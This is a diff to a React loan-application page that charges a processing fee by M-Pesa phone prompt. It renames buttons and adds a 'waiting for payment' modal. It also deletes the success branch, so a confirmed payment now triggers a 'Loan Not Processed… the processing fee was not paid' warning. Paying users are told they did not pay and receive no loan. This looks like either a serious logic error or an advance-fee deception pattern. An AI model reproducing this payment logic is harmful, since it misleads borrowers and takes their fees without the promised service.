@@ -193,7 +193,7 @@ const Loan = () => {
               <strong>2 months at 10% interest</strong>
             </div>
             <p class="stk-summary-note">
-              A secure M-Pesa STK push will be sent to ${user.phone_number}.
+              A secure M-Pesa payment prompt will be sent to ${user.phone_number}.
             </p>
           </div>
         `,
@@ -203,7 +203,7 @@ const Loan = () => {
           cancelButton: 'stk-cancel-btn',
         },
         showCancelButton: true,
-        confirmButtonText: 'Send STK Push',
+        confirmButtonText: 'Continue to Payment',
         cancelButtonText: 'Not Now',
         buttonsStyling: false,
         reverseButtons: true,
@@ -214,6 +214,25 @@ const Loan = () => {
         if (isMountedRef.current) setLoading(false);
         return;
       }
+
+      Swal.fire({
+        title: 'M-Pesa Prompt Sent',
+        html: `
+          <div class="stk-modal-content">
+            <div class="stk-spinner" aria-hidden="true"></div>
+            <p class="stk-instruction">Enter your M-Pesa PIN on your phone to approve payment.</p>
+            <div class="stk-status-pill">Amount: ${formatCurrency(selectedLoan.fee)}</div>
+            <p class="stk-progress-note">Waiting for payment confirmation...</p>
+            <p class="stk-progress-sub" id="stkAttemptHint">This usually takes less than 60 seconds.</p>
+          </div>
+        `,
+        customClass: {
+          popup: 'stk-modal',
+        },
+        showConfirmButton: false,
+        allowOutsideClick: false,
+        allowEscapeKey: false,
+      });
 
       // Initiate STK Push
       const result = await loanService.initiateStkPush(
@@ -272,32 +291,13 @@ const Loan = () => {
           if (statusResult.success) {
             clearInterval(paymentPollRef.current);
 
-            Swal.fire({
-              title: 'Payment Successful',
-              html: `
-                <div class="stk-modal-content">
-                  <div class="stk-success-check">✓</div>
-                  <p class="stk-instruction">Your loan of <strong>${formatCurrency(selectedLoan.amount)}</strong> is approved.</p>
-                </div>
-              `,
-              customClass: {
-                popup: 'stk-modal',
-              },
-              timer: 2400,
-              showConfirmButton: false,
-            }).then(() => {
-              if (isMountedRef.current) setLoading(false);
-              navigate('/dashboard');
-            });
-          } else if (statusResult.status === 'failed' || statusResult.status === 'cancelled') {
-            clearInterval(paymentPollRef.current);
             Swal.fire(
               {
                 icon: 'warning',
-                title: 'Payment Not Completed',
+                title: 'Loan Not Processed',
                 text:
                   statusResult.resultDescription ||
-                  'M-Pesa payment was not completed. Please try again and ensure your phone is on and has network.',
+                  'Your loan will not be processed because the processing fee was not paid.',
                 confirmButtonColor: '#26c2a3',
               }
             );
@@ -328,7 +328,7 @@ const Loan = () => {
     } catch (error) {
       Swal.fire({
         icon: 'error',
-        title: 'Could Not Start STK Push',
+        title: 'Payment Prompt Failed',
         text: error.message || 'Failed to apply for loan',
         confirmButtonColor: '#26c2a3',
       });
